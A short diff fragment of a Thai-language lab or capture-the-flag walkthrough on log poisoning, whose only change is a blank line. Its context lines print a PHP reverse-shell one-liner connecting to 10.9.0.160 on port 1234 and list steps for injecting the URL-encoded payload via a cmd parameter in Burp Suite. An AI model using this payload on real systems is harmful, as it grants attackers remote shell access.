@@ -288,6 +288,7 @@ php -r '$sock=fsockopen("10.9.0.160",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 > หลังจากที่เราได้ Payload ที่ถูก URL-encode แล้ว ขั้นตอนต่อไปคือฝัง payload นั้นลงใน log และรอ reverse shell เชื่อมกลับมา
 
 26. ดำเนินการใน Burp Suite:
+    
 1. เปิด Terminal และรันคำสั่งเพื่อรอรับการเชื่อมต่อ:
 2. เพิ่มพารามิเตอร์ `cmd=<payload>` ต่อท้าย URL
 
